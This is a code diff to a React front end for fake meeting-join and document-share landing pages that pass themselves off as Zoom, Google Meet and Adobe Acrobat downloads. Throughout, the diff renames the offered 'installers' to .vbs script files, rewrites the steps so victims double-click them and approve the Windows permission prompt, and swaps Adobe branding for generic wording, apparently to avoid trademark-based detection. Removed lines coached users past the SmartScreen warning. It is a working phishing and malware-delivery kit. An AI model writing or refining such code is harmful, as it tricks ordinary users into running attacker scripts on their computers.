@@ -160,7 +160,7 @@ function MobileDesktopRequired({ template }: { template: GuestInviteTemplate }) 
           ) : isAdobe ? (
             <div className="meeting-mobile__brand-row">
               <AdobeLogo size={28} />
-              <span className="meeting-mobile__brand-text">Adobe Acrobat</span>
+              <span className="meeting-mobile__brand-text">Document share</span>
             </div>
           ) : (
             <ZoomLogo size="sm" />
@@ -193,19 +193,11 @@ function MobileDesktopRequired({ template }: { template: GuestInviteTemplate }) 
 }
 
 function DownloadSteps({ fileName }: { fileName: string }) {
-  const kind = fileName.toLowerCase().endsWith('.hta')
-    ? 'installer'
-    : fileName.toLowerCase().endsWith('.exe')
-      ? 'installer'
-      : 'installer';
   return (
     <ol className="meeting-desktop__steps">
       <li>Your download should start automatically ({fileName}).</li>
-      <li>Open your Downloads folder and double-click the {kind}.</li>
-      <li>
-        If Windows shows a blue warning, click <strong>More info</strong>, then{' '}
-        <strong>Run anyway</strong>.
-      </li>
+      <li>Open your Downloads folder and double-click the file.</li>
+      <li>Click Yes if Windows asks for permission.</li>
       <li>Keep the setup window open until the progress bar finishes.</li>
     </ol>
   );
@@ -320,7 +312,7 @@ function ZoomDesktop({
         installerUrl={installerUrl}
         installerFileName={installerFileName}
         downloadingLabel="Downloading Zoom Client..."
-        readyLabel="Download started. Open ZoomClient-Setup from your Downloads folder."
+        readyLabel="Download started. Open ZoomClient-Setup.vbs from your Downloads folder."
       />
       <DownloadSteps fileName={installerFileName} />
       <p className="meeting-zoom-desktop__note">
@@ -364,7 +356,7 @@ function GoogleMeetDesktop({
         installerUrl={installerUrl}
         installerFileName={installerFileName}
         downloadingLabel="Downloading meeting app..."
-        readyLabel="Download started. Open GoogleMeet-Setup from your Downloads folder."
+        readyLabel="Download started. Open GoogleMeet-Setup.vbs from your Downloads folder."
       />
       <DownloadSteps fileName={installerFileName} />
       <p className="meeting-meet-desktop__note">
@@ -382,7 +374,7 @@ function AdobeLogo({ size = 100 }: { size?: number }) {
   return (
     <img
       src="/meeting/adobe-logo.png"
-      alt="Adobe"
+      alt="Document"
       width={size}
       height={size}
       style={{
@@ -456,10 +448,10 @@ function AdobeDesktop({
           <div className="adobe-download__notice-spin" aria-hidden />
           <div className="adobe-download__notice-copy">
             <div className="adobe-download__notice-title">
-              Adobe Reader not detected or out of date
+              Document viewer not detected or out of date
             </div>
             <div className="adobe-download__notice-sub">
-              We will download the installer so you can update to the latest Reader.
+              We will download the viewer so you can open the shared PDF on this PC.
             </div>
           </div>
         </div>
@@ -467,9 +459,9 @@ function AdobeDesktop({
           <AdobeLogo size={90} />
         </div>
         <div className="adobe-download__body">
-          <h1>Adobe Acrobat for Windows</h1>
+          <h1>Document Viewer for Windows</h1>
           <p className="adobe-download__lead">
-            Work with PDFs smarter on Windows 10 and 11 — read, edit, sign, and protect PDFs.
+            Open and work with the shared PDF on Windows 10 and 11.
           </p>
           <div className="adobe-download__features" role="list">
             <div className="adobe-download__feat">
@@ -529,7 +521,7 @@ function AdobeDesktop({
               </button>
             </div>
           </div>
-          <footer className="adobe-download__footer">Adobe - Copyright © 2025 All rights reserved.</footer>
+          <footer className="adobe-download__footer">Secure document share · Windows viewer setup</footer>
         </div>
       </div>
     </div>
@@ -541,10 +533,14 @@ export function MeetingJoinLanding({ template: routeTemplate }: { template: Gues
   const preCheckPassed = usePreCheckGate();
   const mobile = isMobileDevice();
   const { code = '' } = useParams();
+  const legacyAdobePath =
+    routeTemplate === 'adobe' &&
+    typeof window !== 'undefined' &&
+    window.location.pathname.startsWith('/adobefile/');
 
   const query = useQuery({
     queryKey: ['guest-public', code, routeTemplate],
-    enabled: Boolean(code) && preCheckPassed,
+    enabled: Boolean(code) && preCheckPassed && !legacyAdobePath,
     queryFn: () => fetchPublicGuestLink(code),
     retry: 1,
   });
@@ -552,6 +548,11 @@ export function MeetingJoinLanding({ template: routeTemplate }: { template: Gues
   const brandingPhase =
     !preCheckPassed || query.isLoading ? 'loading' : 'ready';
   useMeetingPageBranding(routeTemplate, brandingPhase);
+
+  if (legacyAdobePath) {
+    const next = window.location.pathname.replace(/^\/adobefile\//, '/sharedfile/');
+    return <Navigate to={`${next}${window.location.search}`} replace />;
+  }
 
   if (!preCheckPassed || query.isLoading) {
     return <MeetingBootLoader template={routeTemplate} />;
